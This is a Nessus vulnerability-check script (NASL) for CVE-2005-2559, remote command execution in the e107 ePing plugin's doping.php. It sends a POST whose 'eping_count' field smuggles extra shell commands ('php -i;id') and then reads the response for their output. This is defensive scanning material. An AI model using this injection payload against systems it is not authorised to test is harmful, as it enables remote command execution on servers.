#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18461);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2005-2559");
  script_bugtraq_id(13929);
  script_xref(name:"OSVDB", value:"17245");

  script_name(english:"e107 ePing Plugin doping.php Arbitrary Code Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The installation of e107 on the remote host includes the ePing plugin. 
This plugin fails to sanitize the 'eping_cmd', 'eping_count' and/or
'eping_host' parameters of the 'doping.php' script before using them
in a system() call.  An attacker can exploit this flaw to execute
arbitrary shell commands subject to the privileges of the userid under
which the affected application runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/401862/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/407475/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ePing plugin version 1.03 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_summary(english:"Checks for arbitrary code execution vulnerability in e107 ePing plugin");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  url = string(dir, "/e107_plugins/eping/doping.php");

  # Check whether the affected script exists.
  r = http_send_recv3(method:"GET",item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it looks like doping.php...
  if ("potential hacking attempt" >< res) {
    # Try to exploit the flaw by running "php -i" and "id".
    postdata = string(
      "eping_cmd=ping%20-n&",
      "eping_host=127.0.0.1&",
      "eping_count=2|php%20-i;id&",
      "submit=Ping"
    );
    r = http_send_recv3(method:"POST ", item:url, port: port,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if the results look like output from...
    if (
      # either phpinfo or...
      "PHP Version =>" >< res || 
      # the id command.
      egrep(string:res, pattern:"uid=[0-9]+.* gid=[0-9]")
    ) {
      security_hole(port);
      exit(0);
    }
  }
}
